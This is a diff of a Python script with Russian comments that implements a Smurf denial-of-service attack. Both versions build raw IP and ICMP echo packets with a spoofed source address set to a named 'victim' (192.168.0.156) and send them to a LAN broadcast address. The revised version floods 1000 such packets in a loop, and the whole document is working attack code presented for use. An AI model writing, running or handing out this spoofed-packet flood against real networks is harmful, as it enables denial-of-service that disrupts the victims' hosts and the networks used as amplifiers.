@@ -1,23 +1,12 @@
 import socket
 import struct
 import time
-import random
-import sys
 
-# Типы ICMP-сообщений
 ICMP_ECHO_REQUEST = 8
-ICMP_CODE = 0
-TIMEOUT = 2
-
-# IP-заголовок константы
-IP_VERSION = 4
-IP_IHL = 5
-IP_TTL = 64
-IP_PROTO_ICMP = socket.IPPROTO_ICMP
 
 
 def calculate_checksum(source_string):
-    count_to = (len(source_string) / 2) * 2
+    count_to = (len(source_string) // 2) * 2
     checksum = 0
     count = 0
 
@@ -40,60 +29,61 @@ def calculate_checksum(source_string):
     return answer
 
 
-def create_icmp_packet(identifier):
-    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, ICMP_CODE, 0, identifier, 1)
+def create_icmp_packet():
+    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
     data = struct.pack('d', time.time())
-    checksum = calculate_checksum(header + data)
-    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, ICMP_CODE, socket.htons(checksum), identifier, 1)
-    return header + data
+
+    checksum = calculate_checksum(icmp_header + data)
+    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(checksum), 1, 1)
+
+    return icmp_header + data
 
 
 def create_ip_header(source_ip, dest_ip):
-    ip_ihl_ver = (IP_VERSION << 4) + IP_IHL
-    ip_tot_len = 0  # Kernel will fill the correct total length
-    ip_id = random.randint(0, 65535)
-    ip_frag_off = 0
-    ip_ttl = IP_TTL
-    ip_proto = IP_PROTO_ICMP
-    ip_check = 0  # Kernel will fill the correct checksum
-    ip_saddr = socket.inet_aton(source_ip)
-    ip_daddr = socket.inet_aton(dest_ip)
+    version_ihl = (4 << 4) + 5  # Version 4, IHL 5
+    tos = 0
+    total_length = 20 + 8  # IP header + ICMP packet
+    ip_id = 54321  # ID of this packet
+    fragment_offset = 0
+    ttl = 255  # Time to live
+    protocol = socket.IPPROTO_ICMP
+    checksum = 0
 
-    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, 0, ip_tot_len, ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+    src_ip = socket.inet_aton(source_ip)
+    dst_ip = socket.inet_aton(dest_ip)
+
+    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
+                            ttl, protocol, checksum, src_ip, dst_ip)
+
+    ip_checksum = calculate_checksum(ip_header)
+    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
+                            ttl, protocol, socket.htons(ip_checksum), src_ip, dst_ip)
+
     return ip_header
 
 
-def smurf_attack(target_ip, broadcast_ip):
-    try:
-        # Создание сырого сокета для ICMP
-        icmpsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+def send_smurf_attack(broadcast_ip, victim_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
-        # Включение IP-заголовка и возможности широковещательной передачи
-        icmpsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        icmpsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+    # Устанавливаем флаг IP_HDRINCL, чтобы включить IP-заголовок
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
-        # Подмена IP-адреса источника (жертва)
-        icmp_packet = create_icmp_packet(1)
-        ip_header = create_ip_header(target_ip, broadcast_ip)
+    for i in range(1000):
 
-        # Полный пакет
+        ip_header = create_ip_header(victim_ip, broadcast_ip)
+        icmp_packet = create_icmp_packet()
+
         packet = ip_header + icmp_packet
 
-        # Отправка пакета на широковещательный адрес с использованием sendto, без connect
-        icmpsocket.sendto(packet, (broadcast_ip, 0))
-        print(f"Пакет отправлен с подмененным IP-адресом {target_ip} на {broadcast_ip}")
+        # Отправляем пакет на широковещательный адрес
+        sock.sendto(packet, (broadcast_ip, 0))
 
-    except socket.error as e:
-        print(f"Ошибка при отправке: {e}")
-        print("Возможно, требуется запустить с правами root!")
-        sys.exit(0)
+        print(f"Smurf attack on {victim_ip} via {broadcast_ip}")
 
-    finally:
-        icmpsocket.close()
+        time.sleep(0.01)
 
 
-# Пример использования
-target_ip = "192.168.0.156"  # Адрес жертвы
-broadcast_ip = "192.168.0.255"  # Широковещательный адрес
-smurf_attack(target_ip, broadcast_ip)
+broadcast_ip = "192.168.0.255"  # Широковещательный адрес сети
+victim_ip = "192.168.0.156"  # IP жертвы
+
+send_smurf_attack(broadcast_ip, victim_ip)
